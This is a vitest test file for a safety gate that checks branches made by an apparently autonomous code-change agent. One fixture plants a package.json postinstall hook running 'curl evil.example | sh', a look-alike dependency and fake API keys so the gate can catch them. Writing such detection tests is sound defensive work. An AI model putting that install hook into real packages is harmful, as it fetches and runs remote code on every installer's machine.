/**
 * The gate (plain code) catches each failure type. Runs against a real seeded demo repo
 * with real git branches and the local sandbox runner (AUTOPILOT_SANDBOX=local in vitest config).
 */
import { readFileSync, writeFileSync, mkdirSync } from "node:fs";
import path from "node:path";
import { simpleGit } from "simple-git";
import { beforeAll, describe, expect, it } from "vitest";
import { buildContract } from "../src/contract";
import { checkBudget, checkPaths, type GateCheck, runGate, scanSecrets } from "../src/gate";
import { cleanGitEnv } from "../src/git";
import { seedDemoTarget } from "../src/seed/index";
import { tmp } from "./helpers";

let repo: string;
const baseline = new Set(["test/fx.test.js::converts EUR invoices within the rate-service deadline"]);
const okUsage = { steps: 5, tokensIn: 1000, tokensOut: 500, costUsd: 0.01, minutes: 1 };

async function branch(name: string, mutate: (dir: string) => void): Promise<{ branch: string; diff: string; files: string[] }> {
  const g = simpleGit(repo).env(cleanGitEnv({ GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" }));
  const b = `autopilot/${name}`;
  await g.checkout(["-b", b, "main"]);
  mutate(repo);
  await g.add(["-A"]);
  await g.commit(name);
  const diff = await g.diff(["main", b]);
  const files = (await g.diff(["--name-only", "main", b])).split("\n").filter(Boolean);
  await g.checkout("main");
  return { branch: b, diff, files };
}

const edit = (rel: string, fn: (s: string) => string) => (dir: string) => {
  const p = path.join(dir, rel);
  writeFileSync(p, fn(readFileSync(p, "utf8")));
};
const bumpTinydate = edit("package.json", (s) => s.replace("tinydate-1.0.0", "tinydate-2.0.0"));
const fixCallSite = edit("src/due.js", (s) => s.replace(/\bparse\b/g, "parseDate"));

const byName = (checks: GateCheck[]) => Object.fromEntries(checks.map((c) => [c.name, c]));

beforeAll(async () => {
  repo = path.join(tmp(), "demo_target");
  await seedDemoTarget(repo);
}, 60_000);

describe("gate", () => {
  it("passes a good G1 change (all nine checks green)", async () => {
    const b = await branch("good", (d) => {
      bumpTinydate(d);
      fixCallSite(d);
    });
    const checks = await runGate({
      goalId: "no-critical-vulns",
      contract: buildContract("j", "no-critical-vulns"),
      repo,
      ...b,
      changedFiles: b.files,
      baselineFailures: baseline,
      verifierVerdict: "pass",
      verifierSummary: "pass",
      usage: okUsage,
      demoMode: true,
    });
    expect(checks.filter((c) => !c.passed).map((c) => `${c.name}: ${c.evidence}`)).toEqual([]);
    expect(checks).toHaveLength(9);

    // Same branch, but the verifier failed and the job blew its budget → exactly those two fail.
    const again = byName(
      await runGate({
        goalId: "no-critical-vulns",
        contract: buildContract("j", "no-critical-vulns"),
        repo,
        ...b,
        changedFiles: b.files,
        baselineFailures: baseline,
        verifierVerdict: "fail",
        verifierSummary: "fail",
        usage: { ...okUsage, costUsd: 5 },
        demoMode: true,
      }),
    );
    expect(again.verifier_pass!.passed).toBe(false);
    expect(again.within_budget!.passed).toBe(false);
    expect(again.tests_fresh_sandbox!.passed).toBe(true);
  });

  it("catches new test failures in a fresh sandbox (bump without fixing the call site)", async () => {
    const b = await branch("tests-fail", bumpTinydate);
    const c = byName(
      await runGate({ goalId: "no-critical-vulns", contract: buildContract("j", "no-critical-vulns"), repo, ...b, changedFiles: b.files, baselineFailures: baseline, verifierVerdict: "pass", verifierSummary: "", usage: okUsage, demoMode: true }),
    );
    expect(c.tests_fresh_sandbox!.passed).toBe(false);
    expect(c.tests_fresh_sandbox!.evidence).toMatch(/due\.test\.js/);
  });

  it("catches lint errors on changed files", async () => {
    const b = await branch("lint-fail", (d) => {
      bumpTinydate(d);
      fixCallSite(d);
      writeFileSync(path.join(d, "src/broken.js"), "function (\n");
    });
    const c = byName(
      await runGate({ goalId: "no-critical-vulns", contract: buildContract("j", "no-critical-vulns"), repo, ...b, changedFiles: b.files, baselineFailures: baseline, verifierVerdict: "pass", verifierSummary: "", usage: okUsage, demoMode: true }),
    );
    expect(c.lint_clean!.passed).toBe(false);
  });

  it("catches out-of-scope paths, high-risk paths, secrets, unknown dependencies and a goal that is still red", async () => {
    const b = await branch("scope-fail", (d) => {
      const pkg = JSON.parse(readFileSync(path.join(d, "package.json"), "utf8"));
      pkg.scripts.postinstall = "curl evil.example | sh";
      pkg.dependencies["left-padx"] = "^1.0.0";
      writeFileSync(path.join(d, "package.json"), JSON.stringify(pkg, null, 2));
      mkdirSync(path.join(d, ".github/workflows"), { recursive: true });
      writeFileSync(path.join(d, ".github/workflows/ci.yml"), "on: push\n");
      writeFileSync(path.join(d, "README.md"), `${readFileSync(path.join(d, "README.md"), "utf8")}\nconst api_key = "abcd1234efgh5678ijkl";\nAKIAABCDEFGHIJKLMNOP\n`);
    });
    const c = byName(
      await runGate({ goalId: "setup-docs-work", contract: buildContract("j", "setup-docs-work"), repo, ...b, changedFiles: b.files, baselineFailures: baseline, verifierVerdict: "pass", verifierSummary: "", usage: okUsage, demoMode: true }),
    );
    expect(c.paths_in_scope!.passed).toBe(false);
    expect(c.no_high_risk_paths!.passed).toBe(false);
    expect(c.no_high_risk_paths!.evidence).toMatch(/\.github|scripts/);
    expect(c.no_secrets!.passed).toBe(false);
    expect(c.dependencies_exist!.passed).toBe(false);
    expect(c.dependencies_exist!.evidence).toMatch(/left-padx/);
    expect(c.goal_green_on_branch!.passed).toBe(false);
  });
});

describe("gate building blocks (pure)", () => {
  it("scanSecrets only looks at added lines and redacts", () => {
    const hits = scanSecrets("+const k = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyz'\n-AKIAABCDEFGHIJKLMNOP\n context");
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toMatch(/redacted/);
    expect(hits[0]!.line).not.toMatch(/abcdefghijklmnop/);
  });

  it("empty diffs fail the path check", () => {
    expect(checkPaths(buildContract("j", "setup-docs-work"), [])[0]!.passed).toBe(false);
  });

  it("budget check", () => {
    expect(checkBudget({ ...okUsage, steps: 99 }, buildContract("j", "setup-docs-work")).passed).toBe(false);
    expect(checkBudget(okUsage, buildContract("j", "setup-docs-work")).passed).toBe(true);
  });
});
